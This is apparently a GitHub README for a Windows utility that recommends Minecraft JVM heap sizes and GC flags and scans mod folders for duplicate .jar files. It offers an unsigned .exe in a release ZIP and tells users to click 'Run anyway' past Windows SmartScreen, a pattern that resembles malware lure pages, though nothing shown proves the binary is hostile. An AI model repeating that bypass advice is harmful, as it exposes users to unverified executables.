<p align="center">
  <img src="https://i.postimg.cc/B6qqwqTn/banner.png" alt="Minecraft Modpack Optimizer — JVM GC Flag Generator, RAM Sizer & Mod JAR Scanner" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Minecraft%20JVM%20%26%20Mod%20Tuner-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-mc--jvm--tuner--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Minecraft Modpack Optimizer — JVM GC Flag Generator, RAM Sizer & Mod JAR Scanner

**Modded Minecraft freezing for 2 seconds every time garbage collection runs, or crashing on startup from duplicate/mismatched mod .jars? Calculate exact G1GC / Generational ZGC JVM arguments for your system RAM and scan your mods folder in seconds.**

Minecraft Modpack Optimizer solves the two biggest headaches in modded Minecraft Java: **preventing garbage-collection stutter caused by over-allocating 16+ GB heap RAM without tuned GC flags, and scanning `mods\*.jar` metadata (`fabric.mod.json` / `neoforge.mods.toml`) for duplicates and version mismatches**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) Minecraft Java players** using Vanilla Launcher, Prism Launcher, CurseForge, or Modrinth.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Game freezes for 1–3 seconds every 15 seconds despite high FPS | Over-allocated heap (`16 GB+`) causing massive default GC stop-the-world pauses | Set optimal `6 GB–10 GB` heap + tuned **Aikar G1GC** or **Java 21 Generational ZGC** |
| Crash on startup: `DuplicateModsFoundException` or `ModResolutionException` | Two versions of the same `.jar` mod sitting inside `mods\` | Scan `mods\` metadata to flag duplicate Mod IDs and loader mismatches |
| Dedicated server crashes when copying client `mods\` folder | Client-only visual mods (`Iris`, `Sodium`, `ImmediatelyFast`) left in server folder | Tag client-only vs. universal `.jar` mods before uploading to a server |
| Unsure whether Java 17 or Java 21 is required for your Minecraft version | MC `1.20.5+` / `1.21+` requires Java 21 while `1.18–1.20.4` uses Java 17 | Detect installed `java.exe` versions and match to your pack's MC version |

## Download for Windows

[**Download MCModpackTuner.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/MCModpackTuner.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `MCModpackTuner.exe`? (Key features)

- Detects installed physical RAM and Java (`17` / `21` / `23`) runtimes to recommend exact `-Xms`/`-Xmx` heap sizes.
- Generates copy-ready **Tuned G1GC** and **Java 21 Generational ZGC** JVM flags tailored to your modpack size.
- Scans any `mods\` folder (`Fabric`, `NeoForge`, `Forge`, `Quilt`) to detect duplicate Mod IDs and wrong-loader `.jar` files.
- Creates a quick backup of `options.txt` and `servers.dat` before editing settings.

### Sample Output

```text
[MCModpackTuner] System RAM: 32.0 GB | Detected Java: OpenJDK 21.0.5 (64-bit)
[INFO] Modpack Scan     : 142 .jar mods (NeoForge 1.21.4) | 1 Duplicate flagged: 'lithium-0.14.1.jar'
[OK]   Recommended Heap : -Xms8G -Xmx8G (Leaves 24 GB for OS, shaders & GPU drivers)
[OK]   Generated GC     : -XX:+UseZGC -XX:+ZGenerational -XX:+AlwaysPreTouch (Copied!)
```

The release ZIP is named `MCModpackTuner.zip`; the Windows executable inside is named `MCModpackTuner.exe`.

1. Close MC Modpack Tuner before updating or replacing executable files.
2. Click **Download MCModpackTuner.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `MCModpackTuner.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with Minecraft Java Edition (Java 17 / Java 21+).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `MCModpackTuner.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Eliminating 2-second garbage-collection freeze spikes

Proper heap sizing (`6–10 GB` instead of `20 GB`) paired with modern ZGC/G1GC eliminates stop-the-world stutters.

### Catching duplicate `.jar` files and Fabric/NeoForge mixups

Reads internal `.jar` mod manifests to pinpoint exact conflicting files immediately.

### Verifying Java 17 vs. Java 21 runtime paths

Prevents `UnsupportedClassVersionError` crashes when switching Minecraft versions.

### One-click copy into Prism, CurseForge, Modrinth, or Official Launcher

Paste optimized JVM arguments straight into your instance settings.

## Default folders and configuration paths

MC Modpack Tuner inspects standard `.minecraft` and custom launcher instance folders:

```text
%APPDATA%\.minecraft\mods\
```

Typical directory layout:

```text
InstanceFolder\
├── mods\
│   └── *.jar              (Scanned for duplicate Mod IDs & loader tags)
├── options.txt
└── servers.dat
```

Avoid allocating more than 10 GB–12 GB to Minecraft unless running massive 400+ mod packs with high-res PBR shaders, as oversized heaps increase GC pause times.

## Quick start guide

Follow these steps to get started:

1. **Extract `MCModpackTuner.zip` and launch `MCModpackTuner.exe`.** Select your Minecraft version (`1.20.1` / `1.21.4`) and modpack size.
2. **Browse to your instance's `mods` folder to check for duplicate or incompatible `.jar` files.** Remove any flagged duplicate versions.
3. **Click **Copy Optimized JVM Arguments**.** Paste into your launcher's Java / JVM Arguments field and set RAM slider to the recommended GB.

### Data safety note

MC Modpack Tuner reads `.jar` manifests in read-only mode without altering mod archives.

## What the status summary shows

MC Modpack Tuner displays **system RAM, installed Java versions, scanned `.jar` mod count, duplicate/loader warnings, and tailored JVM flags**.

## FAQ

**Why does giving Minecraft 24 GB of RAM cause lag spikes?**

In Java, larger heaps take longer to scan during garbage collection cycles; `6 GB–10 GB` with tuned G1GC or Java 21 Generational ZGC gives much smoother frame pacing.

**Should I choose G1GC or Generational ZGC?**

Use **Generational ZGC** if running Minecraft `1.20.5+` / `1.21+` on Java 21+, or **Tuned G1GC** for Minecraft `1.18–1.20.4` on Java 17.

**Does this work with Prism Launcher, CurseForge, and Modrinth?**

Yes—you can point it to any launcher instance's `mods` folder and paste the generated JVM arguments into any launcher.

## Useful reading

- [Adoptium Eclipse Temurin — Open-Source Java 17 & 21 Runtimes](https://adoptium.net/)

## More Windows Gaming Utilities

- [CoopHost-GameServerManager](../CoopHost-GameServerManager) — 1-click dedicated server manager for Minecraft, Palworld & Valheim
- [ModDrop-UniversalPakInstaller](../ModDrop-UniversalPakInstaller) — Drag-and-drop ZIP/PAK mod installer with conflict check
- [PortWatch-LocalPortKiller](../PortWatch-LocalPortKiller) — Find & free blocked Windows TCP/UDP ports in one click
- [WakeLock-KeepAwakeTray](../WakeLock-KeepAwakeTray) — Keep Windows awake while hosting servers & downloading modpacks

*Independent community project. Not affiliated with Mojang Studios, Microsoft, CurseForge, or Modrinth.*
